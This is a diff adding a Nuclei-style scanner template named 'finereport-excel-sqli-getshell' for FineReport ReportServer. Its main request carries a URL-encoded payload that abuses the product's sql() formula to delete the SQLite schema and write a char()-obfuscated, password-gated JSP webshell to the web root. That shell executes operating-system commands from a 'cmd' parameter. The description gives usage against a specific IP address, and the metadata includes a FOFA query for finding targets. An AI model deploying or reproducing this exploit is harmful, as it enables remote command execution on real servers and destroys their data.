@@ -1,0 +1,68 @@
+id: finereport-excel-sqli-getshell
+
+info:
+  name: finereport-excel-sqli-getshell
+  author: ro1t
+  severity: critical
+  description: |
+    使用方式: http://101.200.231.33/webroot/6bcs6.jsp?pwd=password&cmd=tasklist cmd参数直接拼接命令行
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="帆软-FineReport"
+  tags: finereport,rce,sqli,vuln
+
+variables:
+  string: '{{rand_base(8, "abc")}}'
+  filename: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+      - |
+        GET /webroot/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Op: getSessionID
+        Viewlets: [{'reportlet':'/'}]
+      - |
+        GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%22p%22%3A%7B%22x%22%3A2%7D%7D&__parameters__=%7B%7D HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Params: %3Ctest%3E%0A%3CLargeDatasetExcelExportJS%20dsName%3D%22XX%22%20colNames%3D%22%7B%7D%22%3E%0A%3CParameters%3E%0A%3CParameter%3E%0A%3CAttributes%20name%3D%22aaa%22/%3E%0A%3CO%20t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27FRDemo2.db%27%29%22%2C1%29-sql%28%27FRDemo%27%2C%22pragma%20writable_schema%3Don%22%2C1%29-sql%28%27FRDemo%27%2C%22delete%20from%20sqlite_schema%22%2C1%29-sql%28%27FRDemo%27%2C%22create%20table%20a%28u%20text%29%22%2C1%29-sql%28%27FRDemo%27%2C%22replace%20into%20a%20values%28char%2860%29%7C%7Cchar%2837%29%7C%7Cchar%2810%29%7C%7Cchar%28105%29%7C%7Cchar%28102%29%7C%7Cchar%2832%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%28112%29%7C%7Cchar%2897%29%7C%7Cchar%28115%29%7C%7Cchar%28115%29%7C%7Cchar%28119%29%7C%7Cchar%28111%29%7C%7Cchar%28114%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2846%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%2897%29%7C%7Cchar%28108%29%7C%7Cchar%28115%29%7C%7Cchar%2840%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%28101%29%7C%7Cchar%28115%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2880%29%7C%7Cchar%2897%29%7C%7Cchar%28114%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%28114%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%28112%29%7C%7Cchar%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%28123%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28106%29%7C%7Cchar%2897%29%7C%7Cchar%28118%29%7C%7Cchar%2897%29%7C%7Cchar%2846%29%7C%7Cchar%28105%29%7C%7Cchar%28111%29%7C%7Cchar%2846%29%7C%7Cchar%2873%29%7C%7Cchar%28110%29%7C%7Cchar%28112%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2882%29%7C%7Cchar%28117%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%28105%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2882%29%7C%7Cchar%28117%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%28105%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%2840%29%7C%7Cchar%2841%29%7C%7Cchar%2846%29%7C%7Cchar%28101%29%7C%7Cchar%28120%29%7C%7Cchar%28101%29%7C%7Cchar%2899%29%7C%7Cchar%2840%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%28101%29%7C%7Cchar%28115%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2880%29%7C%7Cchar%2897%29%7C%7Cchar%28114%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%28114%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2899%29%7C%7Cchar%28109%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2873%29%7C%7Cchar%28110%29%7C%7Cchar%28112%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%2840%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2832%29%7C%7Cchar%2897%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2845%29%7C%7Cchar%2849%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%28121%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%2891%29%7C%7Cchar%2893%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%28110%29%7C%7Cchar%28101%29%7C%7Cchar%28119%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%28121%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%2891%29%7C%7Cchar%2850%29%7C%7Cchar%2848%29%7C%7Cchar%2852%29%7C%7Cchar%2856%29%7C%7Cchar%2893%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2860%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2862%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28119%29%7C%7Cchar%28104%29%7C%7Cchar%28105%29%7C%7Cchar%28108%29%7C%7Cchar%28101%29%7C%7Cchar%2832%29%7C%7Cchar%2840%29%7C%7Cchar%2840%29%7C%7Cchar%2897%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%2846%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28100%29%7C%7Cchar%2840%29%7C%7Cchar%2898%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%2833%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2845%29%7C%7Cchar%2849%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%28123%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%28110%29%7C%7Cchar%28101%29%7C%7Cchar%28119%29%7C%7Cchar%2832%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28103%29%7C%7Cchar%2840%29%7C%7Cchar%2898%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28125%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2860%29%7C%7Cchar%2847%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2862%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%28125%29%7C%7Cchar%2837%29%7C%7Cchar%2862%29%29%22%2C1%29-sql%28%27FRDemo%27%2C%22COMMIT%22%2C1%29-sql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27%22%2BJOINARRAY%28%5BENV_HOME%2C%27/../{{filename}}.jsp%27%5D%2C%27%27%29%2B%22%27%29%22%2C1%29%3C/Attributes%3E%3C/O%3E%0A%3C/Parameter%3E%0A%3C/Parameters%3E%3C/LargeDatasetExcelExportJS%3E%3C/test%3E
+        Sessionid: {{name}}
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+      - |
+        GET /webroot/{{filename}}.jsp HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Priority: u=0, i
+        Te: trailers
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'status_code_3 == 200'
+          - contains_all(body_3,"SQLite")
+        condition: and
+    extractors:
+      - type: regex
+        name: name
+        part: body_1
+        group: 1
+        regex:
+          - "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"
+        internal: true
